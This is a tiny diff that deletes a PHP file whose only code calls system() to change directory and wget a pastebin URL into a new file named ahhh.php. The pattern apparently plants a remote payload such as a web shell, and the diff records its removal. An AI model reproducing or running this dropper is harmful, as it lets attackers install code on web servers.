@@ -1,3 +1,0 @@
-<?php
-system("cd ../../;wget https://pastebin.com/unm0vVYE -0 ahhh.php");
-?>
